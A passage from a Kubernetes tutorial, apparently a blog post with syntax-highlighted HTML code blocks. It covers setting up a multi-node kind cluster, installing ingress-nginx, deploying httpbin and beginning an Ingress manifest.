<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">extraPortMappings</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #8DDB8C">containerPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">80</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">hostPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">80</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">protocol</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">TCP</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #8DDB8C">containerPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">443</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">hostPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">443</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">protocol</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">TCP</span></span>
<span data-line=""><span style="color: #ADBAC7">- </span><span style="color: #8DDB8C">role</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">worker</span></span>
<span data-line=""><span style="color: #ADBAC7">- </span><span style="color: #8DDB8C">role</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">worker</span></span>
<span data-line=""><span style="color: #ADBAC7">- </span><span style="color: #8DDB8C">role</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">worker</span></span></code></pre></div>
<p>With this we've now generated a 4 node cluster where we have a single
control-plane and three workers.  Then we defined some extra configuration on
the control-plane:</p>
<ul>
<li><strong>kubeadmConfigPatches</strong>: We want to change the default configuration the
cluster uses so it'll tag the nodes with the <code>ingress-ready</code> label so the
controller will use them.</li>
<li><strong>extraPortMappings</strong>: allow the local host to make requests to the Ingress controller over ports 80/443</li>
<li><strong>node-labels</strong>: only allow the ingress controller to run on specific node(s) matching the label selector</li>
</ul>
<p>So now we can create the new cluster with the configuration. Save that config
as <code>kind_config.yml</code> and then run:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">create</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cluster</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kindest/node:v1.25.11</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind_config.yml</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind-multinode</span></span></code></pre></div>
<p>This time I've added a few additional flags on the commandline. <code>--image</code>
allows us to use a different version of kubernetes and <code>--name</code> allows us to
make more than one cluster. So if you didn't destroy the first cluster you'll
see we have two of them now:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kind</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">clusters</span></span>
<span data-line=""><span style="color: #F69D50">kind</span></span>
<span data-line=""><span style="color: #F69D50">kind-multinode</span></span></code></pre></div>
<p>but <code>kind</code> will swap the to the newest cluster by default:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">current-context</span></span>
<span data-line=""><span style="color: #F69D50">kind-kind-multinode</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                           </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">kind-multinode-control-plane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">control-plane</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">107</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.25.11</span></span>
<span data-line=""><span style="color: #F69D50">kind-multinode-worker</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">88</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">v1.25.11</span></span>
<span data-line=""><span style="color: #F69D50">kind-multinode-worker2</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">88</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">v1.25.11</span></span>
<span data-line=""><span style="color: #F69D50">kind-multinode-worker3</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">88</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">v1.25.11</span></span></code></pre></div>
<p>Now we need to get the <code>ingress-nginx</code> controller installed so we can start
using our cluster with ingress:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apply</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-f</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml</span></span></code></pre></div>
<p>The manifests contains <code>kind</code> specific patches to forward the hostPorts to the ingress controller, set taint tolerations and schedule it to the custom labelled node.</p>
<p>This will take a little bit of time to get up and running, you can monitor it
by running:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">wait</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--namespace</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ingress-nginx</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #6CB6FF">--for=condition=ready</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #6CB6FF">--selector=app.kubernetes.io/component=controller</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #6CB6FF">--timeout=90s</span></span></code></pre></div>
<p>or just manually check the status:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">all</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ingress-nginx</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                                            </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">pod/ingress-nginx-admission-create-bbmlc</span><span style="color: #ADBAC7">        </span><span style="color: #6CB6FF">0</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Completed</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""><span style="color: #F69D50">pod/ingress-nginx-admission-patch-qlnr8</span><span style="color: #ADBAC7">         </span><span style="color: #6CB6FF">0</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Completed</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""><span style="color: #F69D50">pod/ingress-nginx-controller-5f748f78c8-6tc6b</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">ContainerCreating</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                                         </span><span style="color: #96D0FF">TYPE</span><span style="color: #ADBAC7">        </span><span style="color: #96D0FF">CLUSTER-IP</span><span style="color: #ADBAC7">      </span><span style="color: #96D0FF">EXTERNAL-IP</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">PORT</span><span style="color: #ADBAC7">(</span><span style="color: #F69D50">S</span><span style="color: #ADBAC7">)                      </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">service/ingress-nginx-controller</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">NodePort</span><span style="color: #ADBAC7">    </span><span style="color: #6CB6FF">10.96</span><span style="color: #96D0FF">.228.248</span><span style="color: #ADBAC7">   </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">        </span><span style="color: #6CB6FF">80</span><span style="color: #96D0FF">:31771/TCP,443:31759/TCP</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""><span style="color: #F69D50">service/ingress-nginx-controller-admission</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ClusterIP</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">10.96</span><span style="color: #96D0FF">.180.126</span><span style="color: #ADBAC7">   </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">        </span><span style="color: #6CB6FF">443</span><span style="color: #96D0FF">/TCP</span><span style="color: #ADBAC7">                      </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">UP-TO-DATE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AVAILABLE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">deployment.apps/ingress-nginx-controller</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">            </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                                                  </span><span style="color: #96D0FF">DESIRED</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">CURRENT</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">replicaset.apps/ingress-nginx-controller-5f748f78c8</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">         </span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">         </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">COMPLETIONS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">DURATION</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span></span>
<span data-line=""><span style="color: #F69D50">job.batch/ingress-nginx-admission-create</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">22</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">        </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span>
<span data-line=""><span style="color: #F69D50">job.batch/ingress-nginx-admission-patch</span><span style="color: #ADBAC7">    </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">           </span><span style="color: #6CB6FF">35</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">        </span><span style="color: #6CB6FF">68</span><span style="color: #96D0FF">s</span></span></code></pre></div>
<p>Once <code>ingress-nginx-controller</code> is in <code>Running</code> state you are read to go!</p>
<h1>Deploying your first app</h1>
<p>To prove that the cluster is working correctly we will deploy
<a href="https://github.com/Kong/httpbin">httpbin</a> which is a nice little API server
so we can prove everything is working.</p>
<p>Create a <code>httbin.yml</code> file and paste this into it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #6CB6FF">---</span></span>
<span data-line=""><span style="color: #8DDB8C">apiVersion</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">v1</span></span>
<span data-line=""><span style="color: #8DDB8C">kind</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Service</span></span>
<span data-line=""><span style="color: #8DDB8C">metadata</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">labels</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">app</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">service</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #8DDB8C">spec</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">ports</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">http</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">port</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">8000</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">targetPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">8080</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">selector</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">app</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #6CB6FF">---</span></span>
<span data-line=""><span style="color: #8DDB8C">apiVersion</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">apps/v1</span></span>
<span data-line=""><span style="color: #8DDB8C">kind</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Deployment</span></span>
<span data-line=""><span style="color: #8DDB8C">metadata</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #8DDB8C">spec</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">replicas</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">2</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">selector</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">matchLabels</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">app</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">version</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">v1</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">template</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">metadata</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">labels</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">app</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">version</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">v1</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">spec</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">containers</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">image</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">docker.io/mccutchen/go-httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">imagePullPolicy</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">IfNotPresent</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">ports</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">        - </span><span style="color: #8DDB8C">containerPort</span><span style="color: #ADBAC7">: </span><span style="color: #6CB6FF">8080</span></span></code></pre></div>
<p>This is creating a couple of Kubernetes resources:</p>
<ul>
<li><code>Service</code>: This is exposing the port to the ingress</li>
<li><code>Deployment</code>: This is actually launching the service</li>
</ul>
<p>So we are not using the ingress yet but we can prove that we can launch the
service at least.  So apply those manifests:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apply</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-f</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">httpbin.yml</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #F69D50">service/httpbin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">created</span></span>
<span data-line=""><span style="color: #F69D50">deployment.apps/httpbin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">created</span></span></code></pre></div>
<p>You should see two pods come up.  You should wait for them to get into the
<code>Running</code> status:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">wide</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">                      </span><span style="color: #96D0FF">READY</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RESTARTS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">IP</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">NODE</span><span style="color: #ADBAC7">                     </span><span style="color: #96D0FF">NOMINATED</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">NODE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">READINESS</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">GATES</span></span>
<span data-line=""><span style="color: #F69D50">httpbin-5c5494967-2z5wz</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">48</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">10.244</span><span style="color: #96D0FF">.3.3</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">kind-multinode-worker3</span><span style="color: #ADBAC7">   </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">           </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span></span>
<span data-line=""><span style="color: #F69D50">httpbin-5c5494967-9lf47</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">1</span><span style="color: #96D0FF">/1</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">0</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">72</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">10.244</span><span style="color: #96D0FF">.1.2</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">kind-multinode-worker</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">           </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span></span></code></pre></div>
<p>We can now use port forwarding to access it. <code>httpbin</code> is exposed on <code>8000</code> so
lets create port <code>9000</code> on our host that forwards to it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">port-forward</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">service/httpbin</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">9000</span><span style="color: #96D0FF">:8000</span></span>
<span data-line=""><span style="color: #F69D50">Forwarding</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">127.0</span><span style="color: #96D0FF">.0.1:9000</span><span style="color: #ADBAC7"> -</span><span style="color: #F47067">></span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">80</span></span>
<span data-line=""><span style="color: #F69D50">Forwarding</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> [::1]:9000 -</span><span style="color: #F47067">></span><span style="color: #ADBAC7"> 80</span></span></code></pre></div>
<p>You can access it via:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">localhost:9000/get</span><span style="color: #ADBAC7"> </span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"args"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{},</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"headers"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Accept"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<h1>Using Ingress</h1>
<p>Now to use the ingress rather than port forwarding we create one additional
resource, the <code>Ingress</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">apiVersion</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">networking.k8s.io/v1</span></span>
<span data-line=""><span style="color: #8DDB8C">kind</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">Ingress</span></span>
<span data-line=""><span style="color: #8DDB8C">metadata</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">name</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">httpbin-ingress</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">annotations</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">nginx.ingress.kubernetes.io/rewrite-target</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">/$2</span></span>
<span data-line=""><span style="color: #8DDB8C">spec</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">ingressClassName</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">nginx</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">rules</span><span style="color: #ADBAC7">:</span></span>
